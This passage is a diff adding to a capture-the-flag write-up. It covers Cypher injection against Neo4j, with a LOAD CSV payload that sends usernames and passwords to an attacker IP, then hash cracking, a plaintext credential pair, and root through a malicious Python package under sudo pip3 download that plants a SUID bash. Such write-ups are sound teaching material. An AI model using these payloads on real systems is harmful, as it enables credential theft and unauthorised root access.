@@ -507,24 +507,129 @@ LOAD CSV will send output to our server as shown below:
 
 ![obraz](https://github.com/user-attachments/assets/2e29c9e5-5cfe-492b-8d55-15469bed4d3c)
 
+We have two labels: employees and user.    
+The intresting one is probably user.  
+
+From my understanding "user" here is kind of similar to a table in SQL.  
+I guessed that it will contain username and password and used this query:  
+```
+' OR 1=1 WITH 1 AS a MATCH (u:user) WITH u.username AS un, u.password AS pw LOAD CSV FROM "http://10.10.14.9/?" + un + "_" + pw AS l RETURN l//
+```
+Now if we come back to the python server we get:  
+![obraz](https://github.com/user-attachments/assets/d4c281ea-115c-477e-8a0f-2242895dc983)
+
+admin's password we already know but john seems promising.  
+We can identify which hashing algorithm it is in any online hash identifier:  
+![obraz](https://github.com/user-attachments/assets/0f970d90-0df4-47d3-8acd-8ea3531b1ae8)
+
+We can now put this hash in a file and run hashcat with mode 1400 for sha256 hash:  
+
+![obraz](https://github.com/user-attachments/assets/0cb6ca1b-c528-499d-829f-e33ae51f7719)
+
+It cracked:  
+
+![obraz](https://github.com/user-attachments/assets/51dd556f-243d-4fb8-af2e-841b8f9c0967)
+
+Lastly with credentials we can connect via ssh and retrieve a flag:  
+
+![obraz](https://github.com/user-attachments/assets/e549f9a6-28a6-4fa3-9305-b6c6da813959)
+
+![obraz](https://github.com/user-attachments/assets/fdb88a03-53cc-4c41-908c-76a00d688a99)
 
 
 
+## Priv esc to root
+
+One of the first things I check when enumerating linux is sudo -l command which shows us which commands we can run as other user:  
+
+![obraz](https://github.com/user-attachments/assets/9e438eb3-b8fa-4543-9404-95f21e718bd2)
+
+It turned out that we can run:  
+```
+/usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
+```
+as root without a password.  
+
+Workflow here is going to be creating malicious package and download it but it has to be hosted on localhost port 3000.  
+Luckily for us port 3000 is running already on the target machine.  
+
+Tunnel that we previously set using chisel will help us here.  
+Let's open this port 3000 on kali (remember to use proxychains in foxyproxy)  
+
+![obraz](https://github.com/user-attachments/assets/c91da41b-7260-46fc-8b43-f781c091cf11)
+
+It runs gogs - a lightweight, self-hosted Git service (like GitHub but you run it yourself).  
+gogs will be perfect to host a malicious package.  
+
+We can login with john credentials:  
+```
+john:ThisIs4You
+```
+
+There is only one repository:  
+![obraz](https://github.com/user-attachments/assets/d7296a32-d55a-41d4-8566-5cdca06b93fa)
 
 
+## Building and hosting malicious python package
+
+We will use this github repository as a template to build malicious python package:  
+```
+git clone https://github.com/wunderwuzzi23/this_is_fine_wuzzi.git
+```
+
+![obraz](https://github.com/user-attachments/assets/3edb449d-8aec-4b17-a832-6cea050cf52e)
 
 
+Make sure you install those two on kali:  
+```
+pip install setuptools
+pip install build
+```
+
+Now open setup.py and change what you need, mine looked like this: 
+
+![obraz](https://github.com/user-attachments/assets/1fa4e766-0785-4d33-9a57-e8b1d41f518c)
+
+After changing we save this file and build it:  
+![obraz](https://github.com/user-attachments/assets/cfda5722-0650-4af2-8d53-3e5366976595)
+
+Now we have it here:  
+
+![obraz](https://github.com/user-attachments/assets/c4e32317-4ffb-4f4f-a042-f0030ccb1686)
+
+Now upload it in the gogs website to "Test" repository:    
+
+![obraz](https://github.com/user-attachments/assets/2c0a026d-560a-4790-ae3e-0e640af3075b)
+
+After it uploads it should look like this:  
+
+![obraz](https://github.com/user-attachments/assets/d8dd0d8b-5923-4a9b-b44c-b6a40d214369)
+
+Now click on this file, and right-click on "raw" then "copy link":  
+
+![obraz](https://github.com/user-attachments/assets/8960ca54-75a9-4d75-bbe2-2fe141bb49ba)
+
+Go to settings and set this repository to public:  
+Just uncheck one box and click "update settings"  
+
+![obraz](https://github.com/user-attachments/assets/db7d1c34-48c5-4fde-b8aa-90566e716515)
 
 
+## Getting root access
 
+After everything is set up we can just run our command with sudo and paste the link that we've previously copied:  
 
+![obraz](https://github.com/user-attachments/assets/218a5fbc-c795-4378-b5f7-44dbbc65ad14)
 
+It should run when downloaded and in case of using my script it copied /bin/bash to /tmp/bash and have it SUID bit.  
 
+![obraz](https://github.com/user-attachments/assets/c2d9ee48-3f77-4363-a915-3fb0e45d51d9)
 
+now we can run it with -p flag to become root and retrieve root flag.  
 
+![obraz](https://github.com/user-attachments/assets/ca9ccacd-7032-445a-b218-b9a26d5a000b)
 
-
-
+Thank you for reading! I hope it helped.  
 
 
 
